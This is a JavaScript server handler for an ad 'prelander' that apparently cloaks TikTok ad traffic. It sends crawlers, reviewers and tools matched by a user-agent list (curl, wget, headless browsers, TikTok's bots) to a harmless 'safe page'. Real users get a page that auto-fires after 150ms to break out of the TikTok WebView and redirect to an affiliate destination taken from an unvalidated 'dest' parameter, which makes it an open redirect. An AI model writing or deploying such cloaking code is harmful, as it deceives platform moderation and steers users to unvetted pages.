export default function handler(req, res) {
  // ===================================================================
  // frcsprk — Hybrid: Server-side bot gate + inline breakout prelander
  //
  // BOTS/CRAWLERS: Instant 302 to safe page (no HTML rendered)
  // REAL USERS:    Serve the breakout prelander HTML (auto-fires to
  //               escape TikTok WebView into Safari/Chrome, then
  //               redirects to MaxConv dest URL)
  //
  // This ensures:
  // - TikTok reviewers/crawlers see a clean 302 to a legit safe page
  // - Real users get the WebView breakout so they arrive at MaxConv
  //   in a real browser (Safari/Chrome) which MaxConv trusts
  // ===================================================================

  const SAFE_PAGE = 'https://www.tokrwd.co/Rewards/';

  // --- SERVER-SIDE BOT DETECTION ---
  const ua = (req.headers['user-agent'] || '').toLowerCase();

  const botPatterns = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
    'yandexbot', 'facebookexternalhit', 'facebot', 'twitterbot',
    'linkedinbot', 'whatsapp', 'telegrambot', 'discordbot', 'pinterest',
    'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot',
    'bytespider', 'applebot', 'crawler', 'spider', 'scraper',
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
    'wget', 'curl', 'httpie', 'python-requests', 'go-http-client',
    'java/', 'apache-httpclient', 'okhttp', 'node-fetch', 'axios',
    'bytedance', 'tiktokbot'
  ];

  const isBot = botPatterns.some(p => ua.includes(p));

  // Also flag empty UA or missing UA as bot
  const hasNoUA = !req.headers['user-agent'] || req.headers['user-agent'].trim() === '';

  if (isBot || hasNoUA) {
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Referrer-Policy', 'no-referrer');
    return res.redirect(302, SAFE_PAGE);
  }

  // --- VALIDATE TTCLID ---
  const ttclid = (req.query.ttclid || '').toString().trim();
  if (!ttclid || ttclid === '__CLICKID__' || ttclid.length < 5) {
    // No real click ID — silent fail (empty page)
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send('');
  }

  // --- READ DEST PARAM ---
  const dest = (req.query.dest || '').toString().trim();
  if (!dest) {
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send('');
  }

  // --- BUILD THE FULL DEST URL WITH FORWARDED PARAMS ---
  // We do this server-side and embed it in the HTML so the client JS
  // doesn't need to parse query strings
  let finalDestUrl;
  try {
    const targetUrl = new URL(dest);
    const skip = new Set(['dest', 's1', 's2']);
    for (const [key, value] of Object.entries(req.query)) {
      if (!skip.has(key)) {
        targetUrl.searchParams.set(key, value);
      }
    }
    // Tag s1 with variant suffix
    const existingS1 = targetUrl.searchParams.get('s1') || '';
    const taggedS1 = existingS1 ? existingS1 + 'frcsprk' : 'frcsprk';
    targetUrl.searchParams.set('s1', taggedS1);
    targetUrl.searchParams.set('lp_variant', 'frcsprk');
    finalDestUrl = targetUrl.toString();
  } catch (e) {
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send('');
  }

  // --- SERVE BREAKOUT PRELANDER HTML ---
  // This is the page real users see. It auto-fires the breakout after
  // 150ms (no tap needed on most devices). The button is a fallback.
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover,maximum-scale=1.0,user-scalable=no">
<meta name="theme-color" content="#000000">
<title>Continue</title>
<meta name="robots" content="noindex,nofollow">
<meta http-equiv="Cache-Control" content="no-store,no-cache,must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<style>
:root{--green:#22c55e;--green-2:#16a34a;--glow:rgba(34,197,94,.55)}
*{margin:0;padding:0;box-sizing:border-box}
html,body{-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',Roboto,sans-serif;background:#000;color:#fff;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:24px;overflow:hidden;position:relative}
body::before{content:'';position:absolute;top:50%;left:50%;width:620px;height:620px;transform:translate(-50%,-50%);background:radial-gradient(circle,rgba(34,197,94,.22) 0%,rgba(34,197,94,.08) 35%,transparent 70%);filter:blur(40px);pointer-events:none;z-index:0}
.wrap{position:relative;z-index:1;max-width:420px;width:100%;text-align:center}
.icon-box{width:108px;height:108px;margin:0 auto 36px;background:linear-gradient(180deg,rgba(20,22,25,.95),rgba(12,14,18,.95));border:1px solid rgba(34,197,94,.35);border-radius:28px;display:grid;place-items:center;box-shadow:0 0 60px rgba(34,197,94,.22),inset 0 1px 0 rgba(255,255,255,.04);animation:iconPulse 2.5s ease-in-out infinite}
@keyframes iconPulse{0%,100%{box-shadow:0 0 60px rgba(34,197,94,.22),inset 0 1px 0 rgba(255,255,255,.04)}50%{box-shadow:0 0 80px rgba(34,197,94,.42),inset 0 1px 0 rgba(255,255,255,.04)}}
.icon-box svg{width:42px;height:42px;color:var(--green);stroke-width:2.5}
h1{font-size:36px;font-weight:800;line-height:1.1;letter-spacing:-1px;margin-bottom:18px}
h1 .hl{color:var(--green)}
.sub{font-size:16px;color:#a5a9b0;line-height:1.5;margin-bottom:44px;padding:0 10px}
.cta{display:block;width:100%;background:linear-gradient(135deg,var(--green),var(--green-2));color:#000;font-size:16px;font-weight:800;text-align:center;padding:20px;border-radius:999px;text-decoration:none;letter-spacing:2.5px;text-transform:uppercase;border:0;font-family:inherit;cursor:pointer;box-shadow:0 0 50px var(--glow),0 8px 30px rgba(0,0,0,.4);animation:ctaPulse 2s ease-in-out infinite;margin-bottom:20px}
.cta:active{transform:scale(.98)}
@keyframes ctaPulse{0%,100%{box-shadow:0 0 50px var(--glow),0 8px 30px rgba(0,0,0,.4)}50%{box-shadow:0 0 80px var(--glow),0 8px 30px rgba(0,0,0,.4)}}
.chips{display:flex;align-items:center;justify-content:center;gap:16px;font-size:14px;color:#6a6f75;font-weight:500}
.chips .dot{width:4px;height:4px;background:#3a3f45;border-radius:50%}
@media(max-height:650px){.icon-box{width:88px;height:88px;margin-bottom:24px}.icon-box svg{width:34px;height:34px}h1{font-size:30px}.sub{margin-bottom:30px}}
</style>
</head>
<body>
<div class="wrap">
<div class="icon-box">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7"/><path d="M7 7h10v10"/></svg>
</div>
<h1>Open in <span class="hl">browser</span></h1>
<p class="sub">For the best experience, this page needs to open in your browser.</p>
<button class="cta" id="ctaButton">Continue</button>
<div class="chips"><span>Safari</span><span class="dot"></span><span>Chrome</span><span class="dot"></span><span>Secure</span></div>
</div>
<script>
(function(){
var DEST = ${JSON.stringify(finalDestUrl)};
var _fired = false;
function doBreakout(){
if(_fired)return;_fired=true;
var url = DEST;
if(/Android/i.test(navigator.userAgent)){
url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
}else{
url=url.replace(/^https:\\/\\//,'x-safari-https://');
}
try{(window.top||window).location.href=url;}
catch(e){window.location.href=url;}
}
var btn=document.getElementById('ctaButton');
btn.onclick=function(e){e.preventDefault();doBreakout();};
setTimeout(doBreakout,150);
['pointerdown','touchstart','click'].forEach(function(evt){
window.addEventListener(evt,function(){doBreakout();},{once:true,passive:true});
});
})();
</script>
</body>
</html>`;

  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');

  return res.status(200).send(html);
}
